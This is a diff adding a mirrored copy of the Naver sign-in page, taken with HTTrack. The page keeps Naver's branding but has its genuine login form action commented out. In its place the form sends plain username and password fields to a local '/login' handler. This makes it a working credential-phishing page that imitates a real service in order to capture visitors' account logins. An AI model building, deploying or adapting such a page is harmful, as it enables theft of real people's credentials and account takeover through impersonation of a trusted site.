@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="ko">
+
+<!-- Mirrored from nid.naver.com/nidlogin.login?mode=form&url=https%3A%2F%2Fwww.naver.com by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 25 May 2020 08:23:03 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+
+<head>
+	<meta charset="UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+	<title>Naver Sign in</title>
+	<link rel="stylesheet" type="text/css" href="login/css/global/desktop/w_2020021172fa.css?20200211">
+
+	<script src="jquery.js"></script>
+	<script>
+		function formChk() {
+
+			if ($('#pw').val() == '') {
+				$('#err_empty_pw').css('display', 'block');
+				return false;
+			}
+			return true;
+		}
+	</script>
+</head>
+
+<body class="global ">
+	<div id="wrap">
+		<div id="u_skip">
+			<a href="#content" id="u_skip_anchor"><span>본문으로 바로가기</span></a>
+		</div>
+		<!-- header -->
+		<div id="header">
+			<h1><a href="http://www.naver.com/" class="sp h_logo" id="log.naver"><span class="blind">NAVER</span></a></h1>
+			<div class="lang">
+				<select id="locale_switch" name="locale_switch" title="언어선택" class="sel">
+					<option value="ko_KR">한국어</option>
+					<option value="en_US">English</option>
+					<option value="zh-Hans_CN">中文(简体)</option>
+					<option value="zh-Hant_TW">中文(台灣)</option>
+				</select>
+			</div>
+		</div>
+		<!-- //header -->
+		<!-- container -->
+		<div id="container">
+			<!-- content -->
+			<div id="content">
+				<div class="title" aria-live="assertive">
+					<p></p>
+				</div>
+				<form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off" action="/login" onsubmit="return formChk();" method="POST">
+					<!--<form id="frmNIDLogin" name="frmNIDLogin" target="_top" AUTOCOMPLETE="off" action="https://nid.naver.com/nidlogin.login" method="POST">
+				<input type="hidden" id="localechange" name="localechange" value="">
+				<input type="hidden" name="encpw" id="encpw" value="">
+<input type="hidden" name="enctp" id="enctp" value="1">
+<input type="hidden" name="svctype" id="svctype" value="1">
+<input type="hidden" name="smart_LEVEL" id="smart_LEVEL" value="1">
+<input type="hidden" name="bvsd" id="bvsd" value="">
+<input type="hidden" name="encnm" id="encnm" value="">
+<input type="hidden" name="locale" id="locale" value="en_US">
+<input type="hidden" name="url" id="url" value="https://www.naver.com/">
+			-->
+
+					<fieldset class="login_form">
+						<legend class="blind">Sign in</legend>
+						<div class="id_area">
+							<div class="input_row" id="id_area">
+								<span class="input_box">
+									<label for="id" id="label_id_area" class="lbl">Username</label>
+									<input type="text" id="id" name="username" accesskey="L" placeholder="아이디" class="int" maxlength="41" value="">
+								</span>
+								<button type="button" disabled="" title="delete" id="id_clear" class="wrg">delete</button>
+							</div>
+							<div class="error" id="err_empty_id" style="display:none" aria-live="assertive"></div>
+						</div>
+						<div class="pw_area">
+							<div class="input_row" id="pw_area">
+								<span class="input_box">
+									<label for="pw" id="label_pw_area" class="lbl">Password</label>
+									<input type="password" id="pw" name="password" placeholder="비밀번호" class="int" maxlength="16">
+								</span>
+								<button type="button" disabled="" title="delete" id="pw_clear" class="wrg">delete</button>
+								<div class="ly_v2" id="err_capslock" style="display:none;">
+									<div class="ly_box">
+										<p><strong>Caps Lock</strong> is on.</p>
+									</div>
+									<span class="sp ly_point"></span>
+								</div>
+							</div>
+							<div class="error" id="err_empty_pw" style="display:none" aria-live="assertive">비밀번호를 입력해주세요.</div>
+						</div>
+
+						<input type="submit" title="로그인" alt="로그인" value="로그인" class="btn_global" id="log.login">
+						<div class="check_info">
+							<div class="login_check">
+								<span class="login_check_box">
+									<input type="checkbox" id="login_chk" name="nvlong" class="" value="off" />
+									<label for="login_chk" id="label_login_chk" class="sp ">로그인 상태 유지</label>
+								</span>
+								<div class="ly_v2" id="persist_usage" style="display:none;">
+									<div class="ly_box">
+										<p>Please use your own PC for keeping your account secure. &nbsp;&nbsp;<a href="https://help.naver.com/support/contents/contents.nhn?serviceNo=532&amp;categoryNo=1523" target="_blank" class="sp btn_check_help">View help</a></p>
+									</div>
+									<span class="sp ly_point"></span>
+								</div>
+							</div>
+						</div>
+					</fieldset>
+				</form>
+				<div class="position_a">
+					<div class="find_info">
+						<p><a target="_blank" id="idinquiry" href="user2/help/idInquiry380c.html?m=routeIdInquiry&amp;lang=en_US">아이디 찾기</a> <span class="bar">|</span> <a target="_blank" id="pwinquiry"
+								href="user2/help/pwInquiry380c.html?m=routePwInquiry&amp;lang=en_US">비밀번호 찾기</a> <span class="bar">|</span> <a target="_blank" id="join" href="user2/V2Join53a8.html?m=agree&amp;lang=en_US">회원가입</a>
+					</div>
+				</div>
+				<div class="social_login">
+					<div class="social_header">
+						<span class="social_title">Sign in & Join with</span>
+					</div>
+					<div class="btn_social_group">
+						<span class="btn_social_align"><a
+								href="https://www.facebook.com/v2.12/dialog/oauth?client_id=293471457383333&amp;redirect_uri=https://nid.naver.com/oauth/global/facebookCallback.nhn&amp;display=page&amp;scope=email,public_profile,user_friends,user_photos,user_posts&amp;state=3433751157"
+								class="btn_social facebook" title="Log in with your Facebook account"><span class="social_ico sp"></span><span class="social_text">Facebook</span></a></span>
+						<span class="btn_social_align"><a
+								href="https://access.line.me/oauth2/v2.1/authorize?response_type=code&amp;scope=profile%20friends%20message.write%20timeline.post%20phone%20email%20openid&amp;client_id=1426360231&amp;redirect_uri=https://nid.naver.com/oauth/global/lineCallback.nhn&amp;state=8471103866&amp;showPermissionApproval=E,H"
+								class="btn_social line" title="Log in with your Line account"><span class="social_ico sp"></span><span class="social_text">Line</span></a></span>
+					</div>
+					<div class="btn_social_group" id="social_extra_view_div" style="display:none">
+
+						<span class="btn_social_align"><a
+								href="https://access.line.me/oauth2/v2.1/authorize?response_type=code&amp;scope=profile%20friends%20message.write%20timeline.post%20phone%20email%20openid&amp;client_id=1426360231&amp;redirect_uri=https://nid.naver.com/oauth/global/lineCallback.nhn&amp;state=6635013575&amp;showPermissionApproval=E,H"
+								class="btn_social line" title="Log in with your Line account"><span class="social_ico sp"></span><span class="social_text">Line</span></a></span>
+					</div>
+				</div>
+			</div>
+			<!-- //content -->
+		</div>
+		<!-- //container -->
+		<!-- footer -->
+		<div id="footer">
+				<ul>
+				<li><a target="_blank" href="http://www.naver.com/rules/service.html" id="fot.agreement">이용약관</a></li>
+				<li><strong><a target="_blank" href="http://www.naver.com/rules/privacy.html" id="fot.privacy">개인정보처리방침</a></strong></li>
+				<li><a target="_blank" href="http://www.naver.com/rules/disclaimer.html" id="fot.disclaimer">책임의 한계와 법적고지</a></li>
+				<li><a target="_blank" href="https://help.naver.com/support/service/main.nhn?serviceNo=532" id="fot.help">회원정보 고객센터</a></li>
+				</ul>
+				<address><em><a target="_blank" href="http://www.navercorp.com" class="logo" id="fot.naver"><span class="blind">naver</span></a></em><em class="copy">Copyright</em> <em class="u_cri">©</em> <a target="_blank" href="http://www.navercorp.com" class="u_cra" id="fot.navercorp">NAVER Corp.</a> <span class="all_r">All Rights Reserved.</span></address>
+			</div>
+		<!-- //footer -->
+	</div>
+	<input type="hidden" id="nclicks_nsc" name="nclicks_nsc" value="nid.login_en">
+	<input type="hidden" id="nid_buk" name="nid_buk" value="none">
+	<input type="hidden" id="ncaptchaSplit" name="ncaptchaSplit" value="none">
+	<input type="hidden" id="id_error_msg" name="id_error_msg" value="Enter your username!">
+	<input type="hidden" id="pw_error_msg" name="pw_error_msg" value="Enter your password!">
+	<!--<input type="hidden" id="locale" name="locale" value="en_US">-->
+	<input type="hidden" id="locale" name="locale" value="ko_KR">
+	<input type="hidden" id="adult_surl_v2" name="adult_surl_v2" value="">
+
+
+	<div id="nv_stat" style="display:none;">20</div>
+</body </html>
